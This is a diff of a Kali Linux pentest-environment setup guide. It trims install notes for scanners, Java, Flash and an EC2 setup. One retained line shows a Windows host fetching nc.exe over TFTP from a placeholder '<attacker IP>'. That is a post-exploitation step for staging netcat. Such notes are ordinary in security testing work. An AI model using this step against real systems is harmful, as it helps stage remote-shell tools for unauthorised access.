@@ -66,14 +66,11 @@ Background: Solid color
 
 git clone https://github.com/leebaird/discover.git /opt/discover/
 cd /opt/discover/
-cp alias /root/.bash_aliases ; source /root/.bash_aliases
-./setup.sh
-update
+./update.sh
 ------------------------------------------------------------------------------------------------------
 
 # gedit
 
-apt-get install gedit-plugins
 gedit
 Edit > Preferences
 View: Display line numbers, Highlight current line
@@ -94,12 +91,6 @@ Add folder: Scanners
      Metasploit       https://localhost:3790
      Nessus           https://localhost:8834
      Nexpose          https://localhost:3780
-------------------------------------------------------------------------------------------------------
-
-# Install Adobe Flash
-
-apt-get -y install flashplugin-nonfree
-update-flashplugin-nonfree --install
 ------------------------------------------------------------------------------------------------------
 
 # Install Apache Directory Studio
@@ -146,37 +137,6 @@ rm <installer file>
 
 nano /opt/google/chrome/google-chrome
 Change the last line to: exec -a "$0" "$HERE/chrome" "$@" --user-data-dir
-------------------------------------------------------------------------------------------------------
-
-# Install Java
-
-java.com
-Linux x64
-tar zxvf jre-7u67-linux-x64.tar.gz
-mv jre1.7.0_67/ /usr/lib/jvm
-update-alternatives --install /usr/bin/java java /usr/lib/jvm/jre1.7.0_67/bin/java 2
-update-alternatives --config java
-rm jdk-7u17-linux-x64.tar.gz
-java -version
-------------------------------------------------------------------------------------------------------
-
-# Install Nessus
-
-www.tenable.com/products/nessus/select-your-operating-system
-Linux > Debian 7.0 (64 bits)
-Nessus-5.2.7-debian6_amd64.deb
-dpkg -i <installer file>
-service nessusd start
-https://localhost:8834
-------------------------------------------------------------------------------------------------------
-
-# Install Nexpose
-
-chmod 755 NeXposeSetup-Linux64.bin
-./NeXposeSetup-Linux64.bin
-cd /opt/rapid7/nexpose/nsc/ && ./nsc.sh
-https://localhost:3780
-If you do not want this service to run at startup:  update-rc.d -f nexposeconsole.rc remove
 ------------------------------------------------------------------------------------------------------
 
 # Install VMware Tools (if needed)
@@ -234,16 +194,6 @@ cp /usr/share/windows-binaries/nc.exe /tftp/
 tftp -i <attacker IP> get nc.exe                 Run from Windows
 ------------------------------------------------------------------------------------------------------
 
-# Update procedure
-
-update
-Burp Suite Pro
-DbVisualizer
-Iceweasel plugins
-Nessus                /opt/nessus/sbin/nessus-update-plugins
-Nexpose
-------------------------------------------------------------------------------------------------------
-
 # VPN
 
 apt-get install network-manager-iodine network-manager-iodine-gnome
@@ -272,23 +222,3 @@ OS X
   ssh -X root@<targetIP>
   Start app that requires a GUI.
   iceweasel &
-------------------------------------------------------------------------------------------------------
-
-# Amazon EC2 (in the process of being updated)
-
-m1.xlarge
-
-chmod 400 amazon.pem
-ssh -i amazon.pem kali@<target IP>
-yes
-
-Cloud:
-sudo su
-apt-get update && apt-cache search kali-linux
-apt-get install kali-linux-full
-apt-get install gnome-desktop-environment
-tightvncserver -geometry 1280x1024
-
-Personal box:
-ssh -L 5901:localhost:5901 -N -f kali@<target IP> -i amazon.pem
-tightvncconnect 127.0.0.1:5901
